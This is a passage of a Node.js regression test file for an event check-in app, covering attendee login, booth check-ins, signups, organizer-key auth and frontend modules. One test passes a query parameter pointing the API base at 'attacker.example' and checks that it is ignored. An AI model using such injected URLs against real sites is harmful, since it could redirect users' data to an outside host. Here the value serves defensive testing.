const assert = require("assert/strict");
const fs = require("fs");
const http = require("http");
const os = require("os");
const path = require("path");
const vm = require("vm");
const { once } = require("events");

const testDb = path.join(os.tmpdir(), `event-app-test-${process.pid}.json`);
process.env.EVENT_APP_DB_PATH = testDb;
process.env.EVENT_APP_ORGANIZER_KEY = "test-organizer-key";

const { server, startServer } = require("../server");

function request(port, action, payload, method = "POST") {
  return new Promise((resolve, reject) => {
    const body = payload === undefined ? "" : JSON.stringify(payload);
    const req = http.request({
      hostname: "127.0.0.1",
      port,
      path: `/api/${action}`,
      method,
      headers: body ? {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
      } : {},
    }, (res) => {
      let chunks = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { chunks += chunk; });
      res.on("end", () => {
        let parsed = null;
        try { parsed = JSON.parse(chunks); }
        catch (e) { return reject(new Error(`Invalid JSON from ${action}: ${chunks}`)); }
        resolve({ status: res.statusCode, body: parsed });
      });
    });
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

function getPage(port, pathname) {
  return new Promise((resolve, reject) => {
    http.get({ hostname: "127.0.0.1", port, path: pathname }, (res) => {
      let body = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { body += chunk; });
      res.on("end", () => resolve({ status: res.statusCode, body }));
    }).on("error", reject);
  });
}

function listHtmlFiles(directory) {
  return fs.readdirSync(directory, { withFileTypes: true }).flatMap((entry) => {
    const fullPath = path.join(directory, entry.name);
    return entry.isDirectory() ? listHtmlFiles(fullPath) : entry.name.endsWith(".html") ? [fullPath] : [];
  });
}

function assertIsoTimestamp(value, label = "timestamp") {
  assert.equal(typeof value, "string", `${label} should be a string`);
  assert.equal(Number.isNaN(Date.parse(value)), false, `${label} should be valid ISO time`);
}

function runInlineScriptSyntaxRegression() {
  const webRoot = path.join(__dirname, "..", "..", "web");
  listHtmlFiles(webRoot).forEach((filename) => {
    const source = fs.readFileSync(filename, "utf8");
    const inlineScript = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi;
    let match;
    while ((match = inlineScript.exec(source))) {
      new vm.Script(match[1], { filename });
    }
  });
}

async function runApiRegression(port) {
  const organizerKey = "test-organizer-key";

  let res = await request(port, "dashboardData", {});
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  assert.equal("totals" in res.body, false);

  res = await request(port, "verifyOrganizer", { organizerKey: "wrong" });
  assert.equal(res.status, 401);
  res = await request(port, "verifyOrganizer", { organizerKey });
  assert.deepEqual(res.body, { ok: true });

  // Booth presentation state is public and PII-free. Each booth starts with
  // an independent waiting state; only an authenticated organizer can change
  // the state for the booth they name.
  res = await request(port, "boothPresentation", { boothId: "art" });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "art");
  assert.equal(res.body.stepIndex, 0);
  assert.equal(res.body.status, "waiting");
  assert.equal(res.body.message, "");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.createdAt, null);
  assert.equal(res.body.updatedAt, null);
  assertIsoTimestamp(res.body.serverNow, "booth presentation serverNow");
  assert.equal("recentCheckins" in res.body, false);

  res = await request(port, "boothPresentation", { boothId: "unknown" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "BOOTH_NOT_FOUND");
  res = await request(port, "updateBoothPresentation", {
    boothId: "art", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "updateBoothPresentation", {
    boothId: "art", stepIndex: 1, status: "not-a-status", message: "Begin", organizerKey,
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_PRESENTATION_STATUS");
  res = await request(port, "updateBoothPresentation", {
    boothId: "art", stepIndex: 1, status: "live", message: "x".repeat(501), organizerKey,
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_PRESENTATION_MESSAGE");

  res = await request(port, "updateBoothPresentation", {
    boothId: "art", stepIndex: 2, status: "live", message: "  Start drawing now.  ", organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "art");
  assert.equal(res.body.stepIndex, 2);
  assert.equal(res.body.status, "live");
  assert.equal(res.body.message, "Start drawing now.");
  assert.equal(res.body.version, 1);
  assertIsoTimestamp(res.body.createdAt, "presentation createdAt");
  assertIsoTimestamp(res.body.updatedAt, "presentation updatedAt");
  assertIsoTimestamp(res.body.serverNow, "presentation update serverNow");
  const presentationCreatedAt = res.body.createdAt;

  res = await request(port, "updateBoothPresentation", {
    boothId: "art", stepIndex: 4, status: "wrap", message: "Stale", version: 0, organizerKey,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "PRESENTATION_CONFLICT");

  res = await request(port, "boothPresentation", { boothId: "heaven" });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "heaven");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.status, "waiting");
  res = await request(port, "updateBoothPresentation", {
    boothId: "art", stepIndex: 3, status: "paused", message: "Hold here.", version: 1, organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.version, 2);
  assert.equal(res.body.createdAt, presentationCreatedAt);
  assert.equal(res.body.status, "paused");
  assert.equal(res.body.message, "Hold here.");

  for (const invalidPhone of ["615555010", "16155550101"]) {
    res = await request(port, "findOrRegisterByPhone", {
      phone: invalidPhone,
      name: "Invalid",
      allowCreate: true,
      organizerKey,
    });
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "INVALID_PHONE");
  }

  res = await request(port, "registerAttendee", { attendeeId: "entry-a", name: "Avery" });
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(res.body.isNew, true);
  assert.equal(res.body.wristbandColor, null);
  res = await request(port, "registerAttendee", { attendeeId: "entry-a", name: "Avery" });
  assert.equal(res.body.isNew, false);

  res = await request(port, "loginAttendee", {
    name: "  aVeRy  ",
    raffleNumber: "#1001",
    portal: "phase2",
  });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "PHASE1_INCOMPLETE");

  res = await request(port, "loginAttendee", {
    name: "  aVeRy  ",
    raffleNumber: "#1001",
    portal: "phase3",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.name, "Avery");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(res.body.wristbandConfirmed, false);
  assert.equal(res.body.wristbandColor, null);
  assert.equal(res.body.phoneLinked, false);
  assertIsoTimestamp(res.body.serverNow, "attendee login serverNow");
  assert.equal("phone" in res.body, false);

  res = await request(port, "loginAttendee", {
    name: "Somebody Else",
    raffleNumber: "1001",
    portal: "phase3",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "ATTENDEE_LOGIN_FAILED");
  assert.equal("attendeeId" in res.body, false);

  res = await request(port, "loginAttendee", { name: "", raffleNumber: "" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "LOGIN_FIELDS_REQUIRED");
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees.length, 1);

  res = await request(port, "confirmWristband", { attendeeId: "entry-a" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_WRISTBAND_COLOR");
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "purple" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_WRISTBAND_COLOR");
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: " Blue " });
  assert.equal(res.status, 200);
  assert.equal(res.body.wristbandColor, "blue");
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "blue" });
  assert.equal(res.status, 200);
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "red" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "WRISTBAND_ALREADY_ASSIGNED");
  res = await request(port, "loginAttendee", {
    name: "Avery",
    raffleNumber: "1001",
    portal: "phase2",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.wristbandConfirmed, true);
  assert.equal(res.body.wristbandColor, "blue");
  assertIsoTimestamp(res.body.serverNow, "phase 2 login serverNow");
  res = await request(port, "attendeePortalSession", { attendeeId: "entry-a", portal: "phase2" });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.wristbandColor, "blue");
  assertIsoTimestamp(res.body.serverNow, "restored session serverNow");

  res = await request(port, "findOrRegisterByPhone", {
    phone: "615-555-0101",
    name: "Guest",
    organizerKey,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "RAFFLE_REQUIRED");

  res = await request(port, "findOrRegisterByPhone", {
    phone: "615-555-0101",
    raffleNumber: "#1001",
    organizerKey,
  });
  assert.equal(res.body.requiresPairingConfirmation, true);
  assert.equal(res.body.name, "Avery");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees[0].phone, null);

  res = await request(port, "findOrRegisterByPhone", {
    phone: "615-555-0101",
    raffleNumber: "#1001",
    confirmPairing: true,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(res.body.name, "Avery");
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees[0].phone, "6155550101");
  res = await request(port, "attendeePortalSession", { attendeeId: "entry-a", portal: "phase2" });
  assert.equal(res.body.phoneLinked, true);
  assert.equal("phone" in res.body, false);

  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    phone: "6155550101",
    boothId: "art",
    boothName: "Art Therapy Table",
    checkedInBy: "staff-kiosk",
  });
  assert.equal(res.status, 401);

  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    phone: "6155550101",
    boothId: "art",
    boothName: "Art Therapy Table",
    checkedInBy: "staff-kiosk",
    organizerKey,
  });
  assert.equal(res.status, 200);
  const artCheckinId = res.body.checkinId;

  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    phone: "6155550101",
    boothId: "art",
    boothName: "Art Therapy Table",
    checkedInBy: "self",
    rating: 4,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.checkinId, artCheckinId);
  assert.equal(res.body.updated, true);
  const artRows = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
    .filter((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "art");
  assert.equal(artRows.length, 1);
  assert.equal(artRows[0].rating, 4);
  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    boothId: "art",
    boothName: "Art Therapy Table",
    checkedInBy: "scheduled-attendee",
    extraData: { sessionNumber: 2, wristbandColor: "blue" },
  });
  assert.equal(res.status, 200);
  const mergedArtRow = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
    .find((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "art");
  assert.equal(mergedArtRow.rating, 4);
  assert.equal(mergedArtRow.extraData.sessionNumber, 2);

  res = await request(port, "myCheckins", { phone: "6155550101" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "ATTENDEE_ID_REQUIRED");
  assert.equal("attendee" in res.body, false);

  res = await request(port, "myCheckins", { attendeeId: "entry-a" });
  assert.deepEqual(res.body.boothIds, ["art"]);
  assert.deepEqual(Object.keys(res.body), ["boothIds"]);

  // A visitor who truly skipped entry can be created explicitly at a kiosk.
  res = await request(port, "findOrRegisterByPhone", {
    phone: "6155550202",
    name: "Guest",
    allowCreate: true,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.raffleNumber, "1002");
  const kioskOnlyId = res.body.attendeeId;

  await request(port, "boothCheckin", {
    attendeeId: kioskOnlyId,
    phone: "6155550202",
    boothId: "newsong",
    boothName: "The New Song in Nashville",
    checkedInBy: "staff-kiosk",
    organizerKey,
  });

  // If that visitor later registers at entry, staff pair their shown raffle
  // with the phone. The entry record wins and prior kiosk activity migrates.
  res = await request(port, "registerAttendee", { attendeeId: "entry-c", name: "Casey" });
  assert.equal(res.body.raffleNumber, "1003");
  res = await request(port, "findOrRegisterByPhone", {
    phone: "6155550202",
    raffleNumber: "1003",
    organizerKey,
  });
  assert.equal(res.body.requiresPairingConfirmation, true);
  let dbBeforeConfirmedMerge = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(dbBeforeConfirmedMerge.attendees.length, 3);
  assert.equal(dbBeforeConfirmedMerge.boothCheckins.find((c) => c.boothId === "newsong").attendeeId, kioskOnlyId);

  res = await request(port, "findOrRegisterByPhone", {
    phone: "6155550202",
    raffleNumber: "1003",
    confirmPairing: true,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-c");
  assert.equal(res.body.raffleNumber, "1003");
  assert.equal(res.body.name, "Casey");

  const dbAfterMerge = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(dbAfterMerge.attendees.length, 2);
  const casey = dbAfterMerge.attendees.find((a) => a.attendeeId === "entry-c");
  assert.ok(casey.aliasIds.includes(kioskOnlyId));
  assert.equal(dbAfterMerge.boothCheckins.find((c) => c.boothId === "newsong").attendeeId, "entry-c");
  res = await request(port, "myCheckins", { attendeeId: kioskOnlyId });
  assert.deepEqual(res.body.boothIds, ["newsong"]);

  res = await request(port, "boothDashboardData", { boothId: "art", organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "boothDashboardData", { boothId: "unknown", organizerKey });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "BOOTH_NOT_FOUND");
  res = await request(port, "boothDashboardData", { boothId: "art", organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "art");
  assert.equal(res.body.totalCheckins, 1);
  assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Avery"]);
  assert.equal("phone" in res.body.recentCheckins[0], false);
  assert.equal("signups" in res.body, false);
  assert.equal(res.body.presentation.boothId, "art");
  assert.equal(res.body.presentation.stepIndex, 3);
  assert.equal(res.body.presentation.status, "paused");
  assert.equal(res.body.presentation.message, "Hold here.");
  assert.equal(res.body.presentation.version, 2);
  assertIsoTimestamp(res.body.serverNow, "booth dashboard serverNow");
  res = await request(port, "boothDashboardData", { boothId: "newsong", organizerKey });
  assert.equal(res.body.totalCheckins, 1);
  assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Casey"]);
  assert.equal(res.body.presentation.boothId, "newsong");
  assert.equal(res.body.presentation.version, 0);

  // A public attendee cannot claim somebody else's phone and receives no PII.
  res = await request(port, "registerAttendee", { attendeeId: "entry-d", name: "Drew" });
  assert.equal(res.body.raffleNumber, "1004");
  res = await request(port, "findOrRegisterByPhone", {
    attendeeId: "entry-d",
    phone: "6155550101",
    name: "Drew",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "PHONE_ALREADY_LINKED");
  assert.equal("name" in res.body, false);
  assert.equal("raffleNumber" in res.body, false);

  res = await request(port, "saveSignupSelections", {
    attendeeId: "entry-d",
    optionIds: ["future", "art", "future"],
  });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.optionIds, ["future", "art"]);
  const drewArtSignupId = res.body.signupIds[1];
  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.deepEqual(res.body.optionIds, ["future", "art"]);
  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: ["art"] });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.optionIds, ["art"]);
  assert.equal(res.body.signupIds[0], drewArtSignupId);
  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: [] });
  assert.deepEqual(res.body.optionIds, []);
  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.deepEqual(res.body.optionIds, []);
  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: ["invalid"] });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_SIGNUP_OPTIONS");

  // A self-service page opened without completing Entry cannot create a
  // hidden raffle record (including after a rehearsal reset).
  res = await request(port, "findOrRegisterByPhone", {
    attendeeId: "missing-public-id",
    phone: "6155550999",
    name: "Bypass",
  });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");

  res = await request(port, "submitSignup", {
    attendeeId: "entry-a",
    phone: "6155550101",
    optionId: "future",
    optionTitle: "Future events",
  });
  const signupId = res.body.signupId;
  assert.equal(res.body.updated, undefined);
  res = await request(port, "submitSignup", {
    attendeeId: "entry-a",
    phone: "(615) 555-0101",
    optionId: "future",
    optionTitle: "Keep me posted on future events",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.signupId, signupId);
  assert.equal(res.body.updated, true);
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).signups.length, 1);
  res = await request(port, "submitSignup", {
    attendeeId: "entry-a",
    phone: "(615) 555-0101",
    optionId: "bible",
    optionTitle: "One-on-one Bible study",
  });
  const secondSignupId = res.body.signupId;
  res = await request(port, "submitSignup", {
    attendeeId: "entry-c",
    phone: "6155550202",
    optionId: "future",
    optionTitle: "Keep me posted on future events",
  });
  const sharedOptionSignupId = res.body.signupId;
  res = await request(port, "confirmSignupInPerson", { signupId, confirmedBy: "staff" });
  assert.equal(res.status, 401);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.signups.length, 3);
  assert.deepEqual(new Set(res.body.signups.map((signup) => signup.optionId)), new Set(["future", "bible"]));
  assert.equal(res.body.signups.filter((signup) => signup.optionId === "future").length, 2);
  assert.equal(res.body.signups.find((signup) => signup.id === signupId).confirmedInPerson, false);
  res = await request(port, "confirmSignupInPerson", { signupId, confirmedBy: "staff", organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.signups.find((signup) => signup.id === signupId).confirmedInPerson, true);
  assert.equal(res.body.signups.find((signup) => signup.id === secondSignupId).confirmedInPerson, false);
  assert.equal(res.body.signups.find((signup) => signup.id === sharedOptionSignupId).confirmedInPerson, false);

  res = await request(port, "resetDemo", {});
  assert.equal(res.status, 401);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.totals.registered, 3);
  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.totals.registered, 0);
  res = await request(port, "boothPresentation", { boothId: "art" });
  assert.equal(res.body.status, "waiting");
  assert.equal(res.body.version, 0);
  res = await request(port, "myCheckins", { attendeeId: "entry-a" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
  res = await request(port, "registerAttendee", { attendeeId: "entry-a", name: "Avery Again" });
  assert.equal(res.body.isNew, true);

  res = await request(port, "registerAttendee", { attendeeId: "entry-z", name: "Avery Again" });
  assert.equal(res.body.raffleNumber, "1002");
  res = await request(port, "loginAttendee", {
    name: "avery again",
    raffleNumber: "1001",
    portal: "phase3",
  });
  assert.equal(res.body.attendeeId, "entry-a");
  res = await request(port, "loginAttendee", {
    name: "Avery Again",
    raffleNumber: "1002",
    portal: "phase3",
  });
  assert.equal(res.body.attendeeId, "entry-z");
  res = await request(port, "submitSignup", {
    attendeeId: "entry-z",
    phone: "",
    optionId: "future",
    optionTitle: "Keep me posted on future events",
  });
  assert.equal(res.status, 200);

  for (const pathname of [
    "/phase1-entry/index.html",
    "/phase2-booths/hub.html",
    "/phase2-booths/booth-heaven.html",
    "/phase2-booths/booth-trivia.html",
    "/phase2-booths/booth-story.html",
    "/phase2-booths/booth-art.html",
    "/phase2-booths/booth-newsong.html",
    "/phase2-booths/kiosk-art.html",
    "/phase2-booths/kiosk-newsong.html",
    "/phase3-signup/index.html",
    "/done/index.html",
    "/phase2-staff/index.html",
    "/phase2-staff/heaven.html",
    "/phase2-staff/trivia.html",
    "/phase2-staff/story.html",
    "/phase2-staff/art.html",
    "/phase2-staff/newsong.html",
  ]) {
    const page = await getPage(port, pathname);
    assert.equal(page.status, 200, pathname);
    assert.match(page.body, /<!DOCTYPE html>/i, pathname);
  }

  res = await request(port, "dashboardData", undefined, "GET");
  assert.equal(res.status, 404);
}

async function runFrontendContractRegression() {
  const phoneSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "phone.js"), "utf8");
  const phoneContext = {};
  vm.createContext(phoneContext);
  vm.runInContext(`${phoneSource}\nthis.__phone = Phone;`, phoneContext);
  const phone = phoneContext.__phone;
  assert.equal(phone.digits("(615) 555-0101"), "6155550101");
  assert.equal(phone.formatInput("6155550101"), "(615) 555-0101");
  assert.equal(phone.formatDisplay("6155550101"), "(615) 555-0101");
  assert.equal(phone.formatDisplay("12345"), "12345");
  assert.equal(phone.isValid("(615) 555-0101"), true);
  assert.equal(phone.isValid("615555010"), false);
  assert.equal(phone.isValid("16155550101"), false);

  const phoneInput = {
    value: "",
    listeners: {},
    addEventListener(type, listener) { this.listeners[type] = listener; },
    setCustomValidity(message) { this.validationMessage = message; },
  };
  phone.bind(phoneInput);
  assert.equal(phoneInput.maxLength, 14);
  assert.equal(phoneInput.inputMode, "numeric");
  phoneInput.value = "6155550101";
  phoneInput.listeners.input();
  assert.equal(phoneInput.value, "(615) 555-0101");
  phoneInput.value = "61555501019";
  phoneInput.listeners.input();
  assert.equal(phoneInput.value, "(615) 555-0101");
  assert.equal(phone.isValid(phoneInput), false);
  assert.match(phoneInput.validationMessage, /10-digit/);
  phoneInput.value = "6155550101";
  phoneInput.listeners.input();
  assert.equal(phone.isValid(phoneInput), true);
  assert.equal(phoneInput.validationMessage, "");

  class FakeStorage {
    constructor() { this.values = new Map(); }
    getItem(key) { return this.values.has(key) ? this.values.get(key) : null; }
    setItem(key, value) { this.values.set(key, String(value)); }
    removeItem(key) { this.values.delete(key); }
  }
  const identityStorage = new FakeStorage();
  const portalStorage = new FakeStorage();
  const backendPortalCalls = [];
  const identityContext = {
    window: { crypto: { randomUUID: () => "generated-id" }, location: { href: "" } },
    localStorage: identityStorage,
    sessionStorage: portalStorage,
    EventAPI: {
      loginAttendee: async (name, raffleNumber, portal) => {
        backendPortalCalls.push(["login", portal]);
        return {
          attendeeId: "portal-attendee",
          name: name.trim(),
          raffleNumber,
          wristbandColor: "blue",
          phoneLinked: false,
          serverNow: "2026-07-18T20:10:00.000Z",
        };
      },
      attendeePortalSession: async (attendeeId, portal) => {
        backendPortalCalls.push(["restore", portal]);
        return {
          attendeeId,
          name: "Jordan Lee",
          raffleNumber: "1001",
          phoneLinked: true,
          serverNow: "2026-07-18T20:11:00.000Z",
        };
      },
    },
  };
  vm.createContext(identityContext);
  const identitySource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "identity.js"), "utf8");
  vm.runInContext(`${identitySource}\nthis.__identity = Identity;`, identityContext);
  assert.equal(identityContext.__identity.peek().attendeeId, undefined);
  assert.equal(identityStorage.getItem("eventapp.identity"), null);
  assert.equal(identityContext.__identity.get().attendeeId, "generated-id");
  identityContext.__identity.clear();

  const attendeePortalSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "attendee-portal.js"), "utf8");
  vm.runInContext(`${attendeePortalSource}\nthis.__attendeePortal = AttendeePortal;`, identityContext);
  const attendeePortal = identityContext.__attendeePortal;
  let portalIdentity = await attendeePortal.signIn("phase2.heaven", "Jordan Lee", "1001");
  assert.equal(portalIdentity.attendeeId, "portal-attendee");
  assert.equal(portalIdentity.wristbandColor, "blue");
  assert.equal(attendeePortal.hasAccess("phase2.heaven"), true);
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), false);
  assert.equal(attendeePortal.hasAccess("phase3"), false);
  assert.deepEqual(backendPortalCalls[0], ["login", "phase2"]);
  portalIdentity = await attendeePortal.restore("phase2.heaven");
  assert.equal(portalIdentity.phoneLinked, true);
  assert.equal(portalIdentity.wristbandColor, "blue");
  assert.deepEqual(backendPortalCalls[1], ["restore", "phase2"]);
  portalIdentity = await attendeePortal.continueAs("phase2");
  assert.equal(portalIdentity.attendeeId, "portal-attendee");
  assert.equal(portalIdentity.wristbandColor, "blue");
  assert.equal(attendeePortal.hasAccess("phase2"), true);
  assert.deepEqual(backendPortalCalls[2], ["restore", "phase2"]);
  await attendeePortal.signIn("phase2.trivia", "Jordan Lee", "1001");
  assert.equal(attendeePortal.hasAccess("phase2.heaven"), true);
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
  attendeePortal.clearAccess("phase2.heaven");
  assert.equal(attendeePortal.hasAccess("phase2.heaven"), false);
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
  await attendeePortal.signIn("phase3", "Jordan Lee", "1001");
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
  assert.equal(attendeePortal.hasAccess("phase3"), true);

  const apiSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "api.js"), "utf8");
  const apiContext = {
    window: { EVENT_APP_CONFIG: { API_BASE_URL: "https://script.google.com/example/exec" } },
    URLSearchParams,
    fetch: async () => ({
      ok: true,
      status: 200,
      json: async () => ({ error: "Organizer access key is invalid.", code: "AUTH_REQUIRED" }),
    }),
  };
  vm.createContext(apiContext);
  vm.runInContext(`${apiSource}\nthis.__eventApi = EventAPI;`, apiContext);
  assert.equal(typeof apiContext.__eventApi.loginAttendee, "function");
  assert.equal(typeof apiContext.__eventApi.boothDashboardData, "function");
  assert.equal(typeof apiContext.__eventApi.boothPresentation, "function");
  assert.equal(typeof apiContext.__eventApi.updateBoothPresentation, "function");
  assert.equal(typeof apiContext.__eventApi.saveSignupSelections, "function");
  assert.equal(typeof apiContext.__eventApi.mySignupSelections, "function");
  await assert.rejects(
    () => apiContext.__eventApi.dashboardData("wrong"),
    (error) => error.code === "AUTH_REQUIRED" && error.status === 200
  );

  const configSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "config.js"), "utf8");
  const publicContext = {
    window: { location: { search: "?base=https://attacker.example", hostname: "event.example" } },
    URLSearchParams,
  };
  vm.createContext(publicContext);
  vm.runInContext(configSource, publicContext);
  assert.equal(publicContext.window.EVENT_APP_CONFIG.API_BASE_URL, "/api");

  const localContext = {
    window: { location: { search: "?base=https://script.google.com/example/exec", hostname: "localhost" } },
    URLSearchParams,
  };
  vm.createContext(localContext);
  vm.runInContext(configSource, localContext);
  assert.equal(localContext.window.EVENT_APP_CONFIG.API_BASE_URL, "/api");

  class FakeElement {
    constructor() {
      this.style = {};
      this.value = "";
      this.textContent = "";
      this.disabled = false;
      this.listeners = {};
    }
    addEventListener(type, listener) { this.listeners[type] = listener; }
    focus() {}
  }
  const authElements = {};
  [
    "organizer-access", "organizer-content", "organizer-key",
    "btn-organizer-unlock", "err-organizer-key", "btn-organizer-lock",
  ].forEach((id) => { authElements[id] = new FakeElement(); });
  let resolveVerification;
  let rejectVerification;
  let unlockedCount = 0;
  const authContext = {
    console: { error() {} },
    document: { getElementById: (id) => authElements[id] || null },
    EventAPI: {
      verifyOrganizer: () => new Promise((resolve, reject) => {
        resolveVerification = resolve;
        rejectVerification = reject;
      }),
    },
  };
  vm.createContext(authContext);
  const authSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "organizer-auth.js"), "utf8");
  vm.runInContext(`${authSource}\nthis.__organizerAuth = OrganizerAuth;`, authContext);
  const auth = authContext.__organizerAuth;
  auth.init({ onUnlocked: () => { unlockedCount += 1; } });

  // Locking while verification is in flight invalidates that response, so it
  // cannot reveal stale kiosk/dashboard state after a later unlock.
  authElements["organizer-key"].value = "first-key";
  authElements["btn-organizer-unlock"].listeners.click();
  authElements["btn-organizer-lock"].listeners.click();
  resolveVerification({ ok: true });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(auth.key(), "");
  assert.equal(unlockedCount, 0);
  assert.equal(authElements["organizer-content"].style.display, "none");

  authElements["organizer-key"].value = "working-key";
  authElements["btn-organizer-unlock"].listeners.click();
  resolveVerification({ ok: true });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(auth.key(), "working-key");
  assert.equal(unlockedCount, 1);

  auth.lock();
  authElements["organizer-key"].value = "missing-config";
  authElements["btn-organizer-unlock"].listeners.click();
  const notConfigured = new Error("not configured");
  notConfigured.code = "ORGANIZER_KEY_NOT_CONFIGURED";
  rejectVerification(notConfigured);
  await new Promise((resolve) => setImmediate(resolve));
  assert.match(authElements["err-organizer-key"].textContent, /not been configured/);
  assert.doesNotMatch(authSource, /sessionStorage|localStorage/);

  const dashboardSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "organizer", "dashboard.html"), "utf8");
  const artKioskSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "kiosk-art.html"), "utf8");
  const songKioskSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "kiosk-newsong.html"), "utf8");
  const phase1Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase1-entry", "index.html"), "utf8");
  const phase2Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "hub.html"), "utf8");
  const phase3Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase3-signup", "index.html"), "utf8");
  const doneSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "done", "index.html"), "utf8");
  const boothRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-room.js"), "utf8");
  const boothCommonSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-common.js"), "utf8");
  const boothsConfigSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booths-config.js"), "utf8");
  const boothsConfigContext = {};
  vm.createContext(boothsConfigContext);
